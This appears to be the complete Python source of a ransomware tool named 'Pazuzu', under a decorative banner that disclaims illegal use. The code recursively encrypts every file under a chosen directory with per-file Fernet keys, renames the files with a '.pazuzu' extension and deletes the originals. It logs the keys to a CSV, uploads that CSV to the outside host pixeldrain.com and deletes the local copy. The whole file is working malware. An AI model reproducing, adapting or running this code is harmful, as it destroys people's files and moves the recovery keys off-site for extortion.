import os
import csv
import base64
import requests
from conf import param
from cryptography.fernet import Fernet


def banner():
    print("")
    print("\033[95m"+r"              ████████████████"+"\033[0m                                                               ")
    print("\033[95m"+r"        ████████      █████       ██"+"\033[0m                                                         ")
    print("\033[95m"+r"     █████          ████        ███"+"\033[0m                                                          ")
    print("\033[95m"+r"   ███            ███          █████"+"\033[0m                                                         ")
    print("\033[95m"+r" ███           █████          ████████"+"\033[0m                                                       ")
    print("\033[95m"+r"██            ██████          ██    ███"+"\033[0m                                                      ")
    print("\033[95m"+r"            ████  ████        ███    ██"+"\033[0m                                                      ")
    print("\033[95m"+r"           ███      █████           ███"+"\033[0m                                                      ")
    print("\033[95m"+r"          ███     ████████████████████"+"\033[0m                                                       ")
    print("\033[95m"+r"         ███      ███     █████████"+"\033[0m                                                          ")
    print("\033[95m"+r"         ██     ███     █████"+"\033[0m"+"\033[97m"+r"            ;-. "+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"   ,   "+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r" ,  "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r"     ")
    print("\033[95m"+r"        ███    ██      ███"+"\033[0m"+"\033[97m"+r"               |  )"+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"   |   "+"\033[0m"+"\033[95m"+r"    "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r" |  "+"\033[0m"+"\033[97m"+r"    "+"\033[0m"+"\033[95m"+r"     ")
    print("\033[95m"+r"        ██     █      ███"+"\033[0m"+"\033[97m"+r"                |-' "+"\033[0m"+"\033[95m"+r" ,-:"+"\033[0m"+"\033[97m"+r" ,-,"+"\033[0m"+"\033[95m"+r" . ."+"\033[0m"+"\033[97m"+r" ,-,"+"\033[0m"+"\033[95m"+r" . ."+"\033[0m"+"\033[97m"+r"   |   "+"\033[0m"+"\033[95m"+r" ,-."+"\033[0m"+"\033[97m"+r" ,-."+"\033[0m"+"\033[95m"+r" | ,"+"\033[0m"+"\033[97m"+r" ,-."+"\033[0m"+"\033[95m"+r" ;-. ")
    print("\033[95m"+r"        ██      █     ██"+"\033[0m"+"\033[97m"+r"                 |   "+"\033[0m"+"\033[95m"+r" | |"+"\033[0m"+"\033[97m"+r"  / "+"\033[0m"+"\033[95m"+r" | |"+"\033[0m"+"\033[97m"+r"  / "+"\033[0m"+"\033[95m"+r" | |"+"\033[0m"+"\033[97m"+r"   |   "+"\033[0m"+"\033[95m"+r" | |"+"\033[0m"+"\033[97m"+r" |  "+"\033[0m"+"\033[95m"+r" |< "+"\033[0m"+"\033[97m"+r" |-'"+"\033[0m"+"\033[95m"+r" |   ")
    print("\033[95m"+r"         █            ██"+"\033[0m"+"\033[97m"+r"                 '   "+"\033[0m"+"\033[95m"+r" `-`"+"\033[0m"+"\033[97m"+r" '-'"+"\033[0m"+"\033[95m"+r" `-`"+"\033[0m"+"\033[97m"+r" '-'"+"\033[0m"+"\033[95m"+r" `-`"+"\033[0m"+"\033[97m"+r"   `--'"+"\033[0m"+"\033[95m"+r" `-'"+"\033[0m"+"\033[97m"+r" `-'"+"\033[0m"+"\033[95m"+r" ' `"+"\033[0m"+"\033[97m"+r" `-'"+"\033[0m"+"\033[95m"+r" '   ")
    print("\033[95m"+r"                      ██"+"\033[0m                                                                     ")
    print("\033[95m"+r"                      ███"+"\033[0m"+"\033[97m"+r"                                𝔫𝔬𝔱 𝔣𝔬𝔯 𝔦𝔩𝔩𝔢𝔤𝔞𝔩 𝔭𝔲𝔯𝔭𝔬𝔰𝔢                 ")
    print("\033[95m"+r"                       ███"+"\033[0m"+"\033[95m"+r"                             𝔥𝔱𝔱𝔭𝔰://𝔤𝔦𝔱𝔥𝔲𝔟.𝔠𝔬𝔪/𝔫𝔞𝔱𝔢𝔨𝔞𝔩𝔦               ")
    print("\033[95m"+r"                        ███"+"\033[0m                                                                  ")
    print("\033[95m"+r"                          ███"+"\033[0m                                                                ")
    print("\033[95m"+r"                            ███"+"\033[0m                                                              ")
    print("")


def check_conf():
    if param['start_dir'] == 'CHANGE_HERE':
        return False
    elif param['tmp_csv'] == 'CHANGE_HERE':
        return False
    else:
        return True


def encryptor(data, key):
    cipher = Fernet(key)
    e_data = cipher.encrypt(data)
    return e_data


def gen_key():
    key = Fernet.generate_key()
    return key


def to_csv(csv_file, filepath, key):
    with open(csv_file, mode='a', newline='') as file:
        csv_w = csv.writer(file)
        key_b64 = base64.b64encode(key).decode('utf-8')
        csv_w.writerow([filepath, key_b64])


def upload_px(filepath):
    url = "https://pixeldrain.com/api/file"
    with open(filepath, 'rb') as file:
        files = {'file': (os.path.basename(filepath), file)}
        response = requests.post(url, files=files)
        response_j = response.json()
        if response_j.get('success') is True:
            px_id = response_j.get('id')
            px_link = f'https://pixeldrain.com/u/{px_id}'
            print("\033[95m"+r"s3cr3t :"+"\033[0m", px_link)
            print("")
            os.remove(filepath)
        else:
            print("\033[95m"+r"s3cr3t :"+"\033[0m", filepath)


def parser(start_dir, csv_file):
    for root, dirs, files in os.walk(start_dir):
        for file in files:
            filepath = os.path.join(root, file)
            try:
                key = gen_key()
                with open(filepath, "rb") as f:
                    filedata = f.read()
                e_data = encryptor(filedata, key)
                new_filepath = filepath + ".pazuzu"
                with open(new_filepath, "wb") as e_file:
                    e_file.write(e_data)
                to_csv(csv_file, new_filepath, key)
                os.remove(filepath)
            except PermissionError:
                continue
            except OSError:
                continue
            except Exception:
                continue
    upload_px(csv_file)


def main():
    try:
        start_dir = param['start_dir']
        tmp_csv = param['tmp_csv']
        conf = check_conf()
        if conf is False:
            exit("[x] Please change conf.py required values")
        parser(start_dir, tmp_csv)
    except Exception as e:
        print(f"[x] Error: {e}")


if __name__ == '__main__':
    try:
        banner()
        main()
    except KeyboardInterrupt:
        exit("[x] Pazuzu stopped.")
